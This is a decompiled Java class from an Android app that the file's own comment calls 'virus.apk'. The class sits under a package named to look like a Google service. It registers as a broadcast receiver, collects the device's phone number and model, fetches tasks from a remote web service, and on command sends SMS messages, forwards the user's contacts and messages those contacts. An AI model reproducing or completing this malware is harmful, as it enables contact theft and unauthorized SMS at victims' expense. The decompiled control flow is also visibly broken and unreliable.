package com.example.google.service;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Build.VERSION;
import android.os.Handler;
import android.os.Message;

public class TaskRequest extends BroadcastReceiver
{
  private WebServiceCalling _Caller;
  private Context _Context;
  private String _Model;
  private String _Phone;
  private Handler taskHandler = new Handler()
  {
    public void handleMessage(Message paramAnonymousMessage)
    {
      switch (paramAnonymousMessage.what)
      {
      case 3:
      default:
        return;
      case 100:
        TaskRequest.this.ProcessTasks(paramAnonymousMessage);
        return;
      case 0:
        new SMSSender(TaskRequest.this._Context).SendSMS(paramAnonymousMessage);
        return;
      case 2:
      }
      new Contacts(TaskRequest.this._Context).ForwardContacts();
    }
  };

  private void ProcessTasks(Message paramMessage)
  {
    String str = paramMessage.obj.toString();
    if (str.indexOf("SMS") > -1);
    try
    {
      this._Caller.Send(this.taskHandler, this._Phone);
      if (str.indexOf("SC") <= -1);
    }
    catch (Exception localException2)
    {
      try
      {
        new Contacts(this._Context).ForwardContacts();
        if (str.indexOf("STC") <= -1);
      }
      catch (Exception localException2)
      {
        try
        {
          while (true)
          {
            this._Caller.SendToContacts(this.taskHandler, this._Phone);
            return;
            localException3 = localException3;
            localException3.printStackTrace();
          }
          localException2 = localException2;
          localException2.printStackTrace();
        }
        catch (Exception localException1)
        {
          localException1.printStackTrace();
        }
      }
    }
  }

  public void SendRequest()
  {
    try
    {
      this._Caller.Request(this.taskHandler, this._Phone, this._Model);
      return;
    }
    catch (Exception localException)
    {
      localException.printStackTrace();
    }
  }

  public void onReceive(Context paramContext, Intent paramIntent)
  {
    this._Context = paramContext;
    if (this._Phone == null)
    {
      this._Phone = Tools.getPhoneNumber(this._Context);
      this._Model = Build.MODEL;
      this._Model = (this._Model + ";" + Build.VERSION.SDK_INT);
    }
    this._Caller = new WebServiceCalling(paramContext);
    SendRequest();
  }
}

/* Location:           F:\SDK\dex2jar-0.0.9.15\virus.apk_dex2jar.jar
 * Qualified Name:     com.example.google.service.TaskRequest
 * JD-Core Version:    0.6.2
 */